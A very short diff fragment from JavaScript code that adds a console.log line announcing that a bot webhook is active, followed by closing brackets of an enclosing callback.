+    console.log(`🤖 Bot Webhook active\n`);
 });
